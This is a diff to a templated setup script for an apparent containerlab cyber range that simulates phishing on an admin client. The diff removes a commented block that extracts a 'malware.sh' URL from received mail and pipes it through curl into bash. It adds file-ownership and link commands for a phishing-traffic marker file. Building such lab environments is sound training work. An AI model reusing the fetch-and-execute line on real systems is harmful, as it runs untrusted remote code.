@@ -59,15 +59,9 @@ docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkd
 docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/new'
 docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/old'
 
-### start retrieving mails with potential phising
+### change location retrievingMail script and add traffic marking file
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c "cp retrieveMail.sh /home/john/."
-
-###docker exec -d --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c "bash retrieveMail.sh &"
-
-{#
-docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN getmail
-john=$(ls -Altr ~/Maildir/new | tail -1 | awk '{print $9}')
-grep -o "http://10.0.0.3:8000/malware.sh" ~/Maildir/new/$john|  xargs curl | bash
-#} 
-
+docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c "chown john:john phishingAttackTraffic.txt"
+docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c "chown john /home/john/retrieveMail.sh"
+docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c "ln phishingAttackTraffic /home/john/phishingAttackTraffic.txt"
 {% endfor %}
